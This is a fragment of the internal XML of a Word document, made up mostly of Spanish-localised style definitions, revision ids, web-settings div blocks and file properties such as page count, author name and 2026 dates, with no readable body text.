    <w:rsid w:val="007D6B36"/>
    <w:rsid w:val="00852965"/>
    <w:rsid w:val="00923836"/>
    <w:rsid w:val="0095293F"/>
    <w:rsid w:val="00957EE6"/>
    <w:rsid w:val="009C6AAB"/>
    <w:rsid w:val="009E1026"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AD120E"/>
    <w:rsid w:val="00AE5F76"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C64930"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CC453F"/>
    <w:rsid w:val="00CE4778"/>
    <w:rsid w:val="00E2575F"/>
    <w:rsid w:val="00E64671"/>
    <w:rsid w:val="00EC2265"/>
    <w:rsid w:val="00F40DF6"/>
    <w:rsid w:val="00F8005C"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00FE2535"/>
    <w:rsid w:val="00FF719C"/>
    <w:rsid w:val="0CB61B4C"/>
    <w:rsid w:val="1DCB27C5"/>
    <w:rsid w:val="284B388C"/>
    <w:rsid w:val="59C903C5"/>
    <w:rsid w:val="5D923490"/>
    <w:rsid w:val="5F891239"/>
    <w:rsid w:val="651F6C22"/>
    <w:rsid w:val="656E29F6"/>
    <w:rsid w:val="6C7465CE"/>
    <w:rsid w:val="6CDE15A9"/>
    <w:rsid w:val="74010CA2"/>
    <w:rsid w:val="796A0F4F"/>
    <w:rsid w:val="7D194B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093BE"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{2255FABB-5361-4F09-9781-10CCBA613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heme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="en-US" w:eastAsia="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Ttulo1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Ttulo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paragraph" w:styleId="Continuarlista2">
    <w:name w:val="List Continue 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:p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Continuarlista3">
    <w:name w:val="List Continue 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="1080"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Continuarlista">
    <w:name w:val="List Continue"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="360"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textoindependiente2">
    <w:name w:val="Body Text 2"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="Textoindependiente2Car"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:after="120" w:line="480" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Lista3">
    <w:name w:val="List 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:ind w:left="1080" w:hanging="360"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Listaconnmeros2">
    <w:name w:val="List Number 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:contextualSpacing/>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paragraph" w:styleId="Listaconnmeros3">
    <w:name w:val="List Number 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Listaconnmeros">
    <w:name w:val="List Number"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="3"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Lista2">
    <w:name w:val="List 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:ind w:left="720" w:hanging="360"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Listaconvietas3">
    <w:name w:val="List Bullet 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="4"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Lista">
    <w:name w:val="List"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:ind w:left="360" w:hanging="360"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Listaconvietas">
    <w:name w:val="List Bullet"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="5"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Listaconvietas2">
    <w:name w:val="List Bullet 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="6"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>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Subttulo">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="SubttuloCar"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="4F81BD" w:themeColor="accent1"/>
      <w:spacing w:val="15"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textoindependiente">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="TextoindependienteCar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Textoindependiente3">
    <w:name w:val="Body Text 3"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="Textoindependiente3Car"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>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Sinespaciado">
    <w:name w:val="No Spacing"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
      <w:lang w:val="en-US" w:eastAsia="en-U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character" w:customStyle="1" w:styleId="TextoindependienteCar">
    <w:name w:val="Texto independiente Car"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:link w:val="Textoindependiente"/>
    <w:uiPriority w:val="99"/>
    <w:qFormat/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Textoindependiente2Car">
    <w:name w:val="Texto independiente 2 Car"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:link w:val="Textoindependiente2"/>
    <w:uiPriority w:val="99"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Textoindependiente3Car">
    <w:name w:val="Texto independiente 3 Car"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:link w:val="Textoindependiente3"/>
    <w:uiPriority w:val="99"/>
    <w:rPr>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>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4061" w:themeColor="accent1" w:themeShade="80"/>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4061" w:themeColor="accent1" w:themeShade="8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customStyle="1" w:styleId="nfasissutil1">
    <w:name w:val="Énfasis sutil1"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:uiPriority w:val="19"/>
    <w:qFormat/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="7F7F7F" w:themeColor="text1" w:themeTint="80"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="nfasisintenso1">
    <w:name w:val="Énfasis intenso1"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:uiPriority w:val="21"/>
    <w:qFormat/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="4F81BD" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Referenciasutil1">
    <w:name w:val="Referencia sutil1"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:uiPriority w:val="31"/>
    <w:qFormat/>
    <w:rPr>
      <w:smallCaps/>
      <w:color w:val="C0504D" w:themeColor="accent2"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Referenciaintensa1">
    <w:name w:val="Referencia intensa1"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:uiPriority w:val="32"/>
    <w:qFormat/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:color w:val="C0504D" w:themeColor="accent2"/>
      <w:spacing w:val="5"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Ttulodellibro1">
    <w:name w:val="Título del libro1"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:uiPriority w:val="33"/>
    <w:qFormat/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:spacing w:val="5"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="TtuloTDC1">
    <w:name w:val="Título TDC1"/>
    <w:basedOn w:val="Ttulo1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="table" w:styleId="Sombreadoclaro">
    <w:name w:val="Light Shading"/>
    <w:basedOn w:val="Tabla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Cuadrculaclara-nfasis1">
    <w:name w:val="Light Grid Accent 1"/>
    <w:basedOn w:val="Tabla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Cuadrculaclara-nfasis2">
    <w:name w:val="Light Grid Accent 2"/>
    <w:basedOn w:val="Tabla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Cuadrculaclara-nfasis3">
    <w:name w:val="Light Grid Accent 3"/>
    <w:basedOn w:val="Tabla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Cuadrculaclara-nfasis4">
    <w:name w:val="Light Grid Accent 4"/>
    <w:basedOn w:val="Tabla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Cuadrculaclara-nfasis5">
    <w:name w:val="Light Grid Accent 5"/>
    <w:basedOn w:val="Tabla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Cuadrculaclara-nfasis6">
    <w:name w:val="Light Grid Accent 6"/>
    <w:basedOn w:val="Tabla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Sombreadomedio1">
    <w:name w:val="Medium Shading 1"/>
    <w:basedOn w:val="Tabla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Cuadrculamedia3-nfasis1">
    <w:name w:val="Medium Grid 3 Accent 1"/>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Cuadrculamedia3-nfasis2">
    <w:name w:val="Medium Grid 3 Accent 2"/>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Cuadrculamedia3-nfasis3">
    <w:name w:val="Medium Grid 3 Accent 3"/>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Cuadrculamedia3-nfasis4">
    <w:name w:val="Medium Grid 3 Accent 4"/>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Cuadrculamedia3-nfasis5">
    <w:name w:val="Medium Grid 3 Accent 5"/>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Cuadrculamedia3-nfasis6">
    <w:name w:val="Medium Grid 3 Accent 6"/>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aoscura">
    <w:name w:val="Dark List"/>
    <w:basedOn w:val="Tabla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957EE6"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="font-claude-response-body">
    <w:name w:val="font-claude-response-body"/>
    <w:basedOn w:val="Normal"/>
    <w:rsid w:val="009C6AAB"/>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HTMLconformatoprevio">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLconformatoprevioCar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="009C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rsid w:val="009C6AAB"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="token">
    <w:name w:val="token"/>
    <w:basedOn w:val="Fuentedeprrafopredeter"/>
    <w:rsid w:val="00FF719C"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00923836"/>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semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="009238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2683">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="1704094988">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="15853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3523">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="953906310">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="402068886">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
            </w:div>
          </w:divsChild>
        </w:div>
        <w:div w:id="1506824414">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="151279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0034">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1398476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22</Pages>
  <Words>4146</Words>
  <Characters>22803</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Daniel Alejandro Aguirre Ceballos</cp:lastModifiedBy>
  <cp:revision>5</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-03-11T23:53:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-14T12:13:00Z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A0C5805C7CC7498ABF130758BD557AA1_13</vt:lpwstr>
  </property>
</Properties>
</file>